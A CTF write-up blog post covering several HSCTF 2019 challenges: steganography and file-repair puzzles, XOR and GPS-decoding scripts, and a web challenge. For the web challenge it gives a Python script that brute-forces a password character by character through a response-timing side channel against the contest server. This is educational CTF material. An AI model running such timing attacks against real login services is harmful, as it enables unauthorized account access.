---
layout: post
title:  "HSCTF - Write up"
date:   2019-06-19 15:04:12
author: Grillette

categories:
    - "CTF-Writeup"
---
  Today's article will present some of the interesting challenges we have managed to solve during this year edition of the HSCTF.
  We were two for this CTF and get to the 84th place and we were pretty happy of that performance, could have been even better but not enough time to invest in it sadly.


![LogoHSCTF]({{ "assets/2019-06-19/LogoHSCTF.png" | absolute_url }} "LogoHSCTF")

<!--excerpt-->

# Forensic
## Cool Image 2

### Challenge Description
> My friend sent me this image, but I can't open it. Can you help me open the image ?
[cool.png]({{ "assets/2019-06-19/cool.png" | absolute_url }})

### Introduction
When we try to open the image we get the following error :
*  *display: improper image header `cool.png' @ error/png.c/ReadPNGImage/4293.*

So our image is damaged because someone modified the raw value of it. We have to repair it so the header of the file is correct and we can read it. We could try to find it by looking into the raw value of our image but I got a better idea ...

### Challenge Resolution
This challenge was really easy, you only needed to use a well known tool used for [steganography](https://en.wikipedia.org/wiki/Steganography) called : **Foremost**
I just wanted to show this challenge for the real beginner who might read this, there is plenty of tool that you need to use during CTF to get some simple flag like this one (it wasn't even the simplier). I made a little wiki for myself to remind me of some useful tool for CTF that I'll try to keep up to date by adding some new tools as I gain some knowledge so feel free to use it ! It's not really well organized but I thought it might help. [Here it is](https://git.grillette.fr/grillage/CTFTools/wiki/Home)

So to finish with this first challenge I just ran the following command line

```bash
foremost cool.png
```

And it extract the repaired image like this :

![coolFlag]({{ "assets/2019-06-19/coolFlag.png" | absolute_url }} "coolFlag")


## Double Trouble
### Challenge Description
> What is a koala anyway ?
[koala.png]({{ "assets/2019-06-19/koala.png" | absolute_url }})
[koala2.png]({{ "assets/2019-06-19/koala2.png" | absolute_url }})

### Introduction
For this challenge we got 2 different image who looks similar. The description of the challenge does not give any hint. Using **strings** we get a flag, judging by the number of solve we can guess that it's not the real flag but we can still give it a try :grin: But it obviously failed ! So we'll need to dive deeper into those images to get something.

### Challenge Resolution
After some research on the file we finally decided to run **zsteg**. It's a tool used to find information hidden in images for example in the least significant byte. We get lucky by finding an url hidden in the first file.
> https://www.mediafire.com/file/0n67qsooy8hcy30/hmmm.txt/fileA

This is a downloadable file which appear to be [GPG](https://gnupg.org/) symmetrically encrypted data. We need a password to decrypt this data. The second image has been useless so far so we try our luck to find something in it. Running zsteg again on it we get the following message in the least significant byte : *passkey: whatdowehavehereJo*. Bingo ! We get the passkey, so we try to decrypt our file with GPG with this passkey. We lost a lot of time because the passkey was actually **whatdowehavehere** but hey we finally get our flag !


# Miscellaneous
## Hidden Flag
### Challenge Description
> This image seems wrong.....did Keith lose the key again?
[chall.png]({{ "assets/2019-06-19/hiddenChall.png" | absolute_url }})

### Introduction
After downloading the image of the challenge, we can't open it, it's unreadable. We try our luck with *binwalk* and *foremost* but couldn't find anything.

Running the *strings* command on our file we get an interesting line at the end : **key is invisible**.

### Challenge Resolution
Thinking of what we can do with a key on a file we obviously though about xoring the content of this file with the key.
We can easily make a quick script in Python :snake: to xor each byte of our file with a chosen key, so let's give it a try.

```python
import sys

def xor(data, key):
    l = len(key)

    decoded = ""
    for i in range(0, len(data)):
            decoded += chr(data[i] ^ ord(key[i % l]))
    return decoded

def main():
    data = bytearray(open('chall.png', 'rb').read())

    key = 'invisible'
    a = xor(data, key)
    open('flag.png', 'wb').write(a)


if __name__ == "__main__":
    main()

```
To explain quickly our script, in the main() function, we open our file and convert it into an array of byte. We then xor each byte looping on our key **invisible**.
We finally write the result xored bytes in a file.

After running our script we have a new readable file.
![hiddenFlag]({{ "assets/2019-06-19/hiddenFlag.png" | absolute_url }} "Hidden Flag")

And we get our precious flag !

## Broken GPS
### Chalenge Description
The description was long so here is a screenshot :

![GPSDescription]({{ "assets/2019-06-19/GPSDescription.png" | absolute_url }} "Broken GPS Description")

And here is the zip file you can download : [input.zip]({{ "assets/2019-06-19/input.zip" | absolute_url }})

### Introduction
Once we unzip our file we got 12 text files looking like this :

![BrokenGPSExample]({{ "assets/2019-06-19/brokenGPSExample.png" | absolute_url }} "Broken GPS Example")

The first line just indicate the number of lines of the file. Different direction are just listed in the rest of the document and we'll have to determine the positionat the end of those GPS indications, so we can determine the correct position if the GPS was not broken and finally calculate the shortest distance between the 2 points.
We can then convert this distance as a letter to get our flag.

We'll have to do that for every single file to have all our required letter, and judging by the number of line of each file, we better write a little script to automatize this task.

### Challenge Resolution
We get the idea of this challenge pretty quickly as we first need to compute the position after every GPS move, found the correct position by inverting every move and finally calculate the distance between the 2 points with this simple formula :

![Equation]({{ "assets/2019-06-19/equation.png" | absolute_url }} "Distance formula")

Once we have the distance we can translate it as a letter as explained in the description. We have to round our distance to the nearest whole number, compute this value modulo 26 which will then correspond to a letter of the alphabet.

We finally write the following script.

```python
import math

def main():
	flag = 'hsctf{'
	alphabet = "abcdefghijklmnopqrstuvwxyz"

	for i in range(1,13):
		fileName = str(i) + '.txt'
		f = open(fileName,'r')
		line = f.readlines()

		j = 1

		# GPS coordinate
		coordinate_x = 0
		coordinate_y = 0

		# Real coordinate
		rCoordinate_x = 0
		rCoordinate_y = 0

		for l in line:
			direction = l.rstrip()
			# The first line show the number of directions N
			if j == 1:
				n = direction
				j = 0
			# Depending of the direction we incremente the right position for the GPS
			# And the opposite for the real coordinate
			if "east" == direction:
				coordinate_x += 1
				rCoordinate_x -= 1
			elif "northeast" == direction :
				coordinate_x += 1
				coordinate_y += 1
				rCoordinate_x -= 1
				rCoordinate_y -= 1
			elif "north" == direction:
				coordinate_y += 1
				rCoordinate_y -= 1
			elif "northwest" == direction :
				coordinate_x -= 1
				coordinate_y += 1
				rCoordinate_x += 1
				rCoordinate_y -= 1
			elif "west" == direction :
				coordinate_x -= 1
				rCoordinate_x += 1
			elif "southwest" == direction:
				coordinate_x -= 1
				coordinate_y -= 1
				rCoordinate_x += 1
				rCoordinate_y += 1
			elif "south" == direction :
				coordinate_y -= 1
				rCoordinate_y += 1
			elif "southeast" == direction:
				coordinate_x += 1
				coordinate_y -= 1
				rCoordinate_x -= 1
				rCoordinate_y += 1

		firstMember = pow(coordinate_x - rCoordinate_x, 2)
		secondMember = pow(coordinate_y - rCoordinate_y, 2)

		distance = math.sqrt(firstMember + secondMember)
		arrondi = int(round(distance))
		letter = arrondi % 26

		flag += alphabet[letter]

		f.close()

	flag += '}'
	print 'flag :', flag

if __name__ == "__main__":
	main()
```


# Web
## Networked Password
### Challenge Description
> Storing passwords on my own server seemed unsafe, so I stored it on a seperate one instead. However, the connection between them is very slow and I have no idea why.

>https://networked-password.web.chal.hsctf.com/

### Introduction
For this one, the challenge description is a pretty good hint. The web page is a simple form with a password input and a 'send' button. We tried looking up the source code, different type of injection but nothing worked at all. But looking at the challenge description we tried to enter the beginning of the flag format : *hsctf{*

Aaaand guess what ? The server response time was way longer !
![timeResponse]({{ "assets/2019-06-19/timeNetworked.png" | absolute_url}})

(If the beginning of our password was wrong, we got instant error response)

Yay I think you understood what we need to do now.

### Challenge Resolution
So with this test, we understood that if we get a correct letter, the response time from the server was longer and the flag was the password. After several tests, to know how much time each good letter added to the response time approximately we ended up with the following script.

```python
import requests, string, time

def main():
	flag = 'hsctf{'

	printable = 'abcdefghijklmnopqrstuvwxyz0123456789_}ABCDEFGHIJKLMNOPQRSTUVWXYZ!?@"#$%&\'()*+,-./:;<=>[\\]^`{|}~'

	initial_time = 0.0
	bTime = time.perf_counter()

	url = 'https://networked-password.web.chal.hsctf.com/'
	r = requests.post(url, data = {'password':flag})

	aTime = time.perf_counter()

	initial_time = aTime - bTime

	print(initial_time, ' sec')

	while 1 :
		for i in range(len(printable)):
			fake = flag
			fake += printable[i]

			before_time = time.perf_counter()

			r = requests.post(url, data = {'password':fake})

			after_time = time.perf_counter()
			exec_time = after_time - before_time

			print('exec_time : ', exec_time)
			print('initial_time : ', initial_time)

			next = fake + printable[i]
			next_bTime = time.perf_counter()
			r = requests.post(url, data = {'password':next})
			next_aTime = time.perf_counter()
			nextTime = next_aTime - next_bTime

			if (exec_time > initial_time + 0.3) and not(nextTime < exec_time - 0.2):
				print('hit')
				flag = fake
				print(flag)
				initial_time = exec_time
				break

		if '}' in flag:
			break


if __name__ == "__main__":
	main()
```

I realized later that I could have used some functions of the requests library but this way works so I'm happy with it. We made some changes with the *printable* stings to get the most important chars first so the execution time is lower, because this script brute-force the flag but is pretty long, we have to wait several seconds for each letter or number we tried.
But we eventually get the flag waiting for this script to make his job.

![NetworkedFlag]({{ "assets/2019-06-19/flagNetworked.png" | absolute_url}})
